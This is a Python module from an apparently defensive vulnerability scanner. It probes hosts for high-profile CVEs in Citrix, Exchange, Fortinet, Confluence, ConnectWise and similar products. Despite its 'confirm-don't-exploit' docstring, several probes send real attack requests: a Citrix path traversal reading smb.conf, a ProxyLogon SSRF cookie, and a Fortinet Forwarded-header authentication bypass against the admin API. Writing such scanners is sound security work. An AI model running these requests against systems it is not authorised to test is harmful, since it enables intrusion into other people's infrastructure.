"""High-impact CVE detection probes — production-honest categorization.

Phase 67 — split into two categories for production honesty:

  TRUE VERIFICATION (status="vulnerable"):
    The probe sends a CVE-specific payload that ONLY a vulnerable target
    responds to. False positives near zero. These are the gold standard.
      - CVE-2019-19781 Citrix ADC path traversal (smb.conf via ../vpns)
      - CVE-2021-26855 ProxyLogon (X-FEServer / X-CalculatedBETarget hdrs)

  PRODUCT DETECTION (status="potentially_vulnerable"):
    The probe identifies the product (Confluence, Spring, F5 BIG-IP, etc.)
    but cannot determine the patch level without the bug payload (which
    would be exploitation). Use these as TRIAGE inputs — confirm patch
    status via vendor security advisories or banner version. The result
    is labeled "potentially_vulnerable" rather than "vulnerable" so it
    can't be mistaken for evidence-based verification.
      - CVE-2022-26134 Confluence OGNL injection
      - CVE-2023-22515 Confluence Data Center
      - CVE-2022-22965 Spring4Shell
      - CVE-2022-1388 F5 BIG-IP iControl REST
      - CVE-2021-21972 VMware vCenter
      - CVE-2022-40684 Fortinet FortiOS
      - CVE-2021-22205 GitLab RCE
      - CVE-2022-1040 Sophos firewall
      - CVE-2024-1709 ConnectWise ScreenConnect
      - CVE-2024-27198 TeamCity
      - CVE-2022-47966 Zoho ManageEngine
      - CVE-2023-34362 MOVEit Transfer

  The CONFIRM-DON'T-EXPLOIT discipline means we never send the actual
  exploit payload — we only confirm the surface exists. Match Nessus's
  NASL plugin philosophy where exploitation is gated behind explicit
  policy.
"""

from __future__ import annotations

import logging
import socket
import ssl
from typing import Optional

from ..core.constants import USER_AGENT

log = logging.getLogger(__name__)


def _http_get(host: str, port: int, path: str, *,
               tls: bool = False, timeout: float = 5.0,
               headers: Optional[dict] = None,
               max_bytes: int = 16384) -> Optional[tuple[int, dict, bytes]]:
    """Send a single HTTP GET, return (status, headers, body)."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        hlines = [f"GET {path} HTTP/1.0",
                  f"Host: {host}",
                  f"User-Agent: {USER_AGENT}",
                  "Connection: close"]
        for k, v in (headers or {}).items():
            hlines.append(f"{k}: {v}")
        sock.sendall(("\r\n".join(hlines) + "\r\n\r\n").encode())
        chunks: list[bytes] = []
        total = 0
        while total < max_bytes:
            try:
                ch = sock.recv(8192)
            except (socket.timeout, OSError, ssl.SSLError):
                break
            if not ch:
                break
            chunks.append(ch)
            total += len(ch)
        sock.close()
    except (socket.timeout, OSError, ssl.SSLError):
        return None
    data = b"".join(chunks)
    if not data:
        return None
    sep = b"\r\n\r\n"
    if sep not in data:
        return None
    head, body = data.split(sep, 1)
    head_text = head.decode("utf-8", errors="replace")
    lines = head_text.split("\r\n")
    try:
        status = int(lines[0].split(" ")[1])
    except (IndexError, ValueError):
        status = 0
    resp_headers: dict[str, str] = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            resp_headers[k.strip()] = v.strip()
    return (status, resp_headers, body)


# ── Citrix ADC / NetScaler (CVE-2019-19781) ──────────────────────────────
def check_citrix_netscaler(host: str, port: int = 443,
                            timeout: float = 4.0) -> Optional[dict]:
    """Path traversal probe — vulnerable systems serve smb.conf via ../vpn"""
    r = _http_get(host, port,
                   "/vpn/../vpns/cfg/smb.conf",
                   tls=True, timeout=timeout)
    if r is None:
        return None
    status, _, body = r
    if status == 200 and b"[global]" in body:
        return {
            "cve": "CVE-2019-19781", "name": "Citrix ADC path traversal",
            "status": "vulnerable", "severity": "CRITICAL",
            "note": "Citrix ADC returned smb.conf via path traversal",
        }
    return None


# ── ProxyLogon (CVE-2021-26855) Exchange SSRF ─────────────────────────────
def check_proxylogon(host: str, port: int = 443,
                      timeout: float = 4.0) -> Optional[dict]:
    headers = {"Cookie": "X-AnonResource=1; X-AnonResource-Backend=localhost/ecp/default.flt?~3"}
    r = _http_get(host, port,
                   "/owa/auth/Current/themes/resources/logon.css",
                   tls=True, timeout=timeout, headers=headers)
    if r is None:
        return None
    status, hdrs, body = r
    if "X-FEServer" in hdrs or "X-CalculatedBETarget" in hdrs:
        return {
            "cve": "CVE-2021-26855", "name": "ProxyLogon",
            "status": "exposed", "severity": "CRITICAL",
            "evidence_headers": [h for h in hdrs
                                  if h.lower().startswith("x-")],
            "note": "Exchange ProxyLogon indicators present",
        }
    return None


# ── Confluence OGNL (CVE-2022-26134) ─────────────────────────────────────
def check_confluence_ognl(host: str, port: int = 8090, *,
                           tls: bool = False,
                           timeout: float = 4.0) -> Optional[dict]:
    # The OGNL payload would EXPLOIT — we just check Confluence presence + version
    r = _http_get(host, port, "/", tls=tls, timeout=timeout)
    if r is None:
        return None
    _, hdrs, body = r
    powered = hdrs.get("X-Confluence-Request-Time") or ""
    if powered or b"Confluence" in body[:2000]:
        return {
            "cve": "CVE-2022-26134", "name": "Confluence OGNL injection",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "note": ("Confluence detected. Manual check required for "
                     "CVE-2022-26134 patch status (need 7.18.1+)"),
        }
    return None


# ── Spring4Shell (CVE-2022-22965) ────────────────────────────────────────
def check_spring4shell(host: str, port: int = 8080, *,
                        tls: bool = False,
                        timeout: float = 4.0) -> Optional[dict]:
    """Check Spring-Web responses for indicators."""
    r = _http_get(host, port, "/", tls=tls, timeout=timeout)
    if r is None:
        return None
    _, hdrs, body = r
    # Spring framework leaves footprints in error pages
    if (b"org.springframework" in body
            or b"Whitelabel Error Page" in body
            or b"spring" in body.lower()[:1000]):
        return {
            "cve": "CVE-2022-22965", "name": "Spring4Shell",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "note": ("Spring application detected. CVE-2022-22965 requires "
                     "JDK 9+, deployed as WAR, and tomcat 9.0.x. Manual confirm needed."),
        }
    return None


# ── F5 BIG-IP iControl REST (CVE-2022-1388) ──────────────────────────────
def check_f5_icontrol(host: str, port: int = 443,
                       timeout: float = 4.0) -> Optional[dict]:
    """Probe the iControl REST endpoint structure."""
    r = _http_get(host, port, "/mgmt/shared/authn/login",
                   tls=True, timeout=timeout)
    if r is None:
        return None
    status, hdrs, body = r
    if (status in (200, 401, 403) and b"BIG-IP" in body) or "BIGIP" in hdrs.get("Server", ""):
        return {
            "cve": "CVE-2022-1388", "name": "F5 BIG-IP iControl REST",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "note": ("F5 BIG-IP iControl REST endpoint exposed. "
                     "Verify patch status (need 15.1.5.1+ / 16.1.2.2+)."),
        }
    return None


# ── VMware vCenter (CVE-2021-21972) ──────────────────────────────────────
def check_vcenter(host: str, port: int = 443,
                   timeout: float = 4.0) -> Optional[dict]:
    r = _http_get(host, port, "/ui/vropspluginui/rest/services/uploadova",
                   tls=True, timeout=timeout)
    if r is None:
        return None
    status, _, _ = r
    if status in (200, 401, 403, 405):
        return {
            "cve": "CVE-2021-21972", "name": "VMware vCenter file upload",
            "status": "exposed_endpoint", "severity": "CRITICAL",
            "note": ("vCenter vROps plugin upload endpoint accessible. "
                     "Verify patch (need 6.5 U3n / 6.7 U3l / 7.0 U1c)"),
        }
    return None


# ── Fortinet FortiOS auth bypass (CVE-2022-40684) ────────────────────────
def check_fortinet(host: str, port: int = 443,
                    timeout: float = 4.0) -> Optional[dict]:
    headers = {
        "User-Agent": "Report Runner",
        "Forwarded": "for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\";",
    }
    r = _http_get(host, port, "/api/v2/cmdb/system/admin",
                   tls=True, timeout=timeout, headers=headers)
    if r is None:
        return None
    status, _, body = r
    if status == 200 and b"http_method" in body:
        return {
            "cve": "CVE-2022-40684", "name": "Fortinet FortiOS auth bypass",
            "status": "vulnerable", "severity": "CRITICAL",
            "note": "Forwarded-header bypass returned admin API content",
        }
    return None


# ── Exchange general detection ───────────────────────────────────────────
def check_exchange_owa(host: str, port: int = 443,
                        timeout: float = 4.0) -> Optional[dict]:
    """Detect OWA + extract version from header for cross-reference."""
    r = _http_get(host, port, "/owa/", tls=True, timeout=timeout)
    if r is None:
        return None
    _, hdrs, body = r
    if b"Outlook Web App" in body or "X-OWA-Version" in hdrs:
        return {
            "service": "exchange-owa", "name": "Exchange OWA detected",
            "status": "informational", "severity": "INFO",
            "owa_version": hdrs.get("X-OWA-Version"),
            "note": "Exchange OWA present. Verify against ProxyLogon/ProxyShell CVE list.",
        }
    return None


# ── GitLab CVE-2021-22205 (ExifTool RCE) ─────────────────────────────────
def check_gitlab(host: str, port: int = 80, *, tls: bool = False,
                  timeout: float = 4.0) -> Optional[dict]:
    r = _http_get(host, port, "/help", tls=tls, timeout=timeout)
    if r is None:
        return None
    status, hdrs, body = r
    if "X-Gitlab-Meta" in hdrs or b"gitlab" in body.lower()[:2000]:
        return {
            "cve": "CVE-2021-22205", "name": "GitLab ExifTool RCE",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "note": ("GitLab detected. CVE-2021-22205 affects 13.10.3 and earlier. "
                     "Check `/help` for version."),
        }
    return None


# ── Sophos firewall (CVE-2022-1040) ──────────────────────────────────────
def check_sophos_firewall(host: str, port: int = 4444,
                            timeout: float = 4.0) -> Optional[dict]:
    r = _http_get(host, port, "/userportal/Controller", tls=True,
                   timeout=timeout)
    if r is None:
        return None
    _, _, body = r
    if b"Sophos" in body or b"User Portal" in body:
        return {
            "cve": "CVE-2022-1040", "name": "Sophos Firewall auth bypass",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "note": "Sophos User Portal accessible. Verify patch CVE-2022-1040.",
        }
    return None


# ── ConnectWise ScreenConnect (CVE-2024-1709) ────────────────────────────
def check_connectwise(host: str, port: int = 8040, *, tls: bool = False,
                       timeout: float = 4.0) -> Optional[dict]:
    r = _http_get(host, port, "/SetupWizard.aspx", tls=tls, timeout=timeout)
    if r is None:
        return None
    status, _, body = r
    if status == 200 and b"ConnectWise" in body:
        return {
            "cve": "CVE-2024-1709", "name": "ConnectWise ScreenConnect auth bypass",
            "status": "vulnerable", "severity": "CRITICAL",
            "note": ("SetupWizard.aspx accessible — likely unpatched. "
                     "Patch required: 23.9.8+"),
        }
    return None


# ── JetBrains TeamCity (CVE-2024-27198) ──────────────────────────────────
def check_teamcity(host: str, port: int = 8111, *, tls: bool = False,
                    timeout: float = 4.0) -> Optional[dict]:
    """Probe TeamCity for auth bypass via /admin path with crafted params."""
    r = _http_get(host, port, "/login.html;jsessionid=anything?test=1",
                   tls=tls, timeout=timeout)
    if r is None:
        return None
    status, hdrs, body = r
    server = hdrs.get("Server", "")
    if "TeamCity" in server or b"TeamCity" in body[:2000]:
        return {
            "cve": "CVE-2024-27198", "name": "TeamCity auth bypass",
            "status": "potentially_vulnerable", "severity": "CRITICAL",
            "server": server,
            "note": "TeamCity detected. Patch to 2023.11.4+ for CVE-2024-27198",
        }
    return None


# ── Zoho ManageEngine (CVE-2022-47966) ───────────────────────────────────
def check_zoho_manageengine(host: str, port: int = 80, *, tls: bool = False,
                             timeout: float = 4.0) -> Optional[dict]:
    for path in ("/AccountsServlet", "/RestAPI/", "/api/json"):
        r = _http_get(host, port, path, tls=tls, timeout=timeout)
        if r is None:
            continue
        _, hdrs, body = r
        if b"Zoho" in body or b"ManageEngine" in body or "ManageEngine" in hdrs.get("Server", ""):
            return {
                "cve": "CVE-2022-47966", "name": "Zoho ManageEngine SAML RCE",
                "status": "potentially_vulnerable", "severity": "CRITICAL",
                "endpoint": path,
                "note": "Zoho ManageEngine detected. CVE-2022-47966 = SAML RCE pre-auth.",
            }
    return None


# ── ConnectWise ScreenConnect (alt port) + a few more compact checks ─────
def check_jboss_jmx(host: str, port: int = 8080, *, tls: bool = False,
                     timeout: float = 4.0) -> Optional[dict]:
    """JBoss JMX console exposure."""
    r = _http_get(host, port, "/jmx-console/", tls=tls, timeout=timeout)
    if r is None:
        return None
    status, _, body = r
    if status == 200 and b"JBoss" in body and b"JMX" in body:
        return {
            "cve": "Multiple-CVE", "name": "JBoss JMX console exposed",
            "status": "exposed", "severity": "CRITICAL",
            "note": "JMX console exposed without authentication",
        }
    return None


def check_jenkins(host: str, port: int = 8080, *, tls: bool = False,
                   timeout: float = 4.0) -> Optional[dict]:
    """Jenkins script console / API exposure."""
    r = _http_get(host, port, "/manage", tls=tls, timeout=timeout)
    if r is None:
        return None
    status, hdrs, _ = r
    if "X-Jenkins" in hdrs:
        return {
            "service": "jenkins", "name": "Jenkins detected",
            "status": "informational", "severity": "INFO",
            "version": hdrs.get("X-Jenkins"),
            "note": f"Jenkins {hdrs.get('X-Jenkins', '')} — check CVEs",
        }
    return None


# ── Dispatch ─────────────────────────────────────────────────────────────
PORT_PROBES_V2 = {
    443: [check_citrix_netscaler, check_proxylogon, check_f5_icontrol,
          check_vcenter, check_fortinet, check_exchange_owa,
          check_sophos_firewall, check_connectwise],
    80: [check_gitlab, check_jboss_jmx, check_jenkins,
         check_confluence_ognl, check_spring4shell,
         check_zoho_manageengine, check_teamcity],
    8080: [check_jboss_jmx, check_jenkins, check_spring4shell,
           check_confluence_ognl, check_teamcity],
    8090: [check_confluence_ognl],
    8111: [check_teamcity],
    8040: [check_connectwise],
    4444: [check_sophos_firewall],
}


def verify_host_v2(host_ip: str, ports: list[int],
                    timeout: float = 4.0) -> list[dict]:
    """Run all v2 verification probes against open ports on a host."""
    findings: list[dict] = []
    for p in ports:
        for probe in PORT_PROBES_V2.get(p, []):
            try:
                # Most v2 probes take (host, port=, timeout=)
                # Some are TLS-only and only take (host, port, timeout)
                try:
                    r = probe(host_ip, p, timeout=timeout)
                except TypeError:
                    r = probe(host_ip, timeout=timeout)
                if r:
                    findings.append(r)
            except Exception as e:
                log.debug("probe %s on %s:%d failed: %s",
                          probe.__name__, host_ip, p, e)
    return findings


def verify_scan_v2(scan_dict: dict) -> dict[str, list[dict]]:
    """Run v2 verification probes against every host in a scan."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    out: dict[str, list[dict]] = {}

    def work(h):
        ports = [p["number"] for p in h.get("ports", [])]
        return (h["ip"], verify_host_v2(h["ip"], ports))

    with ThreadPoolExecutor(max_workers=16) as pool:
        for f in as_completed([pool.submit(work, h)
                                for h in scan_dict.get("hosts", [])]):
            try:
                ip, findings = f.result()
                if findings:
                    out[ip] = findings
            except Exception as e:
                log.debug("v2 verify worker error: %s", e)
    return out
